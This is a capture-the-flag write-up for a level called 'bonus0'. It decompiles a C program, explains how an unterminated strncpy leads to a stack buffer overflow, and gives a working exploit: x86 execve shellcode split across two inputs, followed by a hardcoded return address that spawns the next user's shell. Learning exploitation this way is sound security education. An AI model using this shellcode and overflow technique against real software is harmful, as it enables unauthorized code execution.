<span style="display: flex; justify-content: space-between;"><span style="text-align: left; display: block;">
	[← level9](../level9/solution.md)
</span>
<span style="text-align: center; display: block;">
	[Home](../README.md)
</span>
<span style="text-align: right; display: block;">
	[bonus1 →](../bonus1/solution.md)
</span>
</span>

bonus0
======

Decompilation
-------------

The program looks like this:
```c
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void p(char *dest, const char *s)
{
	char buff[0x1000];

	puts(s);

	read(0, &buff, 0x1000);

	*strchr(buff, '\n') = '\0';

	strncpy(dest, buff, 20);
}

void pp(char *dest)
{
	char dest_a[20];
	char dest_b[20];

	p(dest_a, " - ");
	p(dest_b, " - ");

	strcpy(dest, dest_a);

	dest[strlen(dest)] = ' ';

	strcat(dest, dest_b);
}

int main(void)
{
	char dest[54];

	pp(dest);

	puts(dest);

	return 0;
}
```

The main calls the pp funtion, which calls the p function twice, on two different destinations.

The p function shows a prompt, reads the standard input into a big buffer, replaces the new-line character with a NUL-byte, and copies up to 20 bytes from the big buffer to the destination.

Afterwards, the pp function concatenates both inputs, using the space character as a separator.

For example, if we input the lines "AAAA" and "BBBB", the resulting string will be "AAAA BBBB":
```sh
(echo "AAAA"; sleep 0.1; echo "BBBB") | ./bonus0
```
```
 -
 -
AAAA BBBB
```

Exploitation
------------

Everything works as intended as long as the lines length do not exceed 19 characters.

If we input a longer string, the NUL-terminator will be missing from the 20 bytes that are copied to the destination.

Let's see how strncpy would handle this situation:
```sh
man strncpy
```
```
The strncpy() function is similar to strcpy(), except that at most n  bytes  of  src  are  copied.

Warning: If there is no null byte among the first n bytes of src, the string placed in dest will not be null-terminated.
```

This means that the string stored in dest would not be terminated, and the following call to strcpy would continue to copy the memory following it, until a terminator is found.

```sh
(echo $(printf '%.0sA' {1..20}); echo $(printf '%.0sB' {1..4})) | ./bonus0
```
```
 -
 -
AAAAAAAAAAAAAAAAAAAABBBB BBBB
```

Because the memory following the first string is the second string, it is copied twice.

The final destination buffer is 54 bytes long. We can try to overflow it and overwrite the stored return pointer.

Because the second string is copied twice, and both are separated with a space, we need to account for them to get the right length.
```
len = len_a + 1 + 2 * len_b + 1 = 54

len_a = 20
len_b = (54 - 20 - 1 - 1) / 2 = 16
```

To fill the buffer, we need the second string to be exactly 16 bytes long.

```sh
(echo $(printf '%.0sA' {1..20}); echo $(printf '%.0sB' {1..16})) | ./bonus0  | tail -n1 | wc -c
```
```
54
```

We can determine the address of the destination buffer using gdb, put some shellcode at the beginning and overflow with the buffer's address, to return onto it.

```sh
gdb -batch -ex 'b * 0x080485b4' -ex 'r' -ex 'p (const char *)$eax' ~/bonus0
```
```
...
Breakpoint 1, 0x080485b4 in main ()
$1 = 0xbffff716 "\377\377\001\001"
```

I will reuse the shellcode from level2 again.
Because it is 21 bytes long, we need to put the last byte on the beginning of the second line and adjust the padding length.
```sh
LC_ALL=C # Count bytes instead of graphemes

SHELLCODE=$'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

LINE_A="${SHELLCODE:0:20}"
LINE_B="${SHELLCODE:20:1}$(printf '%.0sB' {1..13})"$'\x16\xf7\xff\xbf'B

(echo "$LINE_A"; sleep 0.1; echo "$LINE_B"; sleep 0.1; echo whoami) | ~/bonus0
```
```
bonus1
```
